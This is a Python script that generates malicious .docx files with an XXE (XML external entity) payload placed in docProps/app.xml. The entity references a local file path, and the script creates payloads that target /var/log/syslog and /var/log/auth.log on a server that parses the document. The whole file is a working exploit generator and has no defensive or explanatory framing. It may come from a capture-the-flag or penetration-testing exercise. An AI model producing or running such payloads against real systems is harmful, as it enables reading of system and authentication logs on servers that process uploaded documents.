import os
import zipfile

# Dossier de sortie (output directory)
output_dir = "generated_docx"
os.makedirs(output_dir, exist_ok=True)

def generate_xxe_docx(target_file: str, output_path: str):
    # Define the XML files with XXE payload
    content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
      <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
      <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
      <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
    </Types>'''

    rels = '''<?xml version="1.0" encoding="UTF-8"?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
      <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
    </Relationships>'''

    document_xml = '''<?xml version="1.0" encoding="UTF-8"?>
    <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
      <w:body>
        <w:p><w:r><w:t>Fake document for XXE injection</w:t></w:r></w:p>
      </w:body>
    </w:document>'''

    core_xml = '''<?xml version="1.0" encoding="UTF-8"?>
    <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
        xmlns:dc="http://purl.org/dc/elements/1.1/"
        xmlns:dcterms="http://purl.org/dc/terms/"
        xmlns:dcmitype="http://purl.org/dc/dcmitype/"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <dc:title>Fake</dc:title>
      <dc:creator>DGSE</dc:creator>
    </cp:coreProperties>'''

    # App.xml with XXE payload – ensure the entity is correctly defined
    app_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///{target_file}">
    ]>
    <Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
      <VictimID>&xxe;</VictimID>  <!-- Reference the entity here -->
      <Pages>1</Pages>
      <Words>5</Words>
      <Characters>32</Characters>
    </Properties>'''

    # Create the .docx file
    with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as docx:
        docx.writestr("[Content_Types].xml", content_types)
        docx.writestr("_rels/.rels", rels)
        docx.writestr("word/document.xml", document_xml)
        docx.writestr("docProps/core.xml", core_xml)
        docx.writestr("docProps/app.xml", app_xml)

    print(f"[*] Fichier généré avec payload XXE pour {target_file} : {output_path}")

# Example usage: Generate payloads for specific files
generate_xxe_docx(target_file="/var/log/syslog", output_path=os.path.join(output_dir, "payload_syslog.docx"))
generate_xxe_docx(target_file="/var/log/auth.log", output_path=os.path.join(output_dir, "payload_auth.docx"))